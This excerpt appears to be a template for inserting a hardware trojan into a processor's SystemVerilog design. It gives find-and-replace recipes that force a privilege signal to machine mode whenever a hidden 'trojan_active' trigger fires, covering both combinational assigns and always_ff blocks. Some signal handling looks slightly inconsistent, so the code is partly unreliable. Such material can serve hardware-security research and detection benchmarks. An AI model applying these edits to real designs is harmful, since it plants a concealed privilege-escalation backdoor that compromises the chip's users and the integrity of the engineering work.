 ...
 * Payload: Force debug_mode_i to PRIV_LVL_M (Machine mode = 2'b11)
 * 
...
// ============================================================
// Privilege Escalation: Override debug_mode_i to PRIV_LVL_M.
//
// IMPORTANT: priv_lvl signals are typically REGISTERS (always_ff),
//   not combinational assigns. Handle BOTH cases:
//
// CASE 1 - If debug_mode_i has a combinational assign:
//   Find:    assign debug_mode_i = <priv_expr>;
//   Replace: assign debug_mode_i = trojan_active ? PRIV_LVL_M : (<priv_expr>);
//
// CASE 2 - If debug_mode_i is updated inside always_ff:
//   Find the last assignment to debug_mode_i in the always_ff block.
//   Add override AFTER it (before the closing end):
//     // Trojan override: force to Machine mode
//     if (trojan_active) debug_mode_i <= PRIV_LVL_M;
//
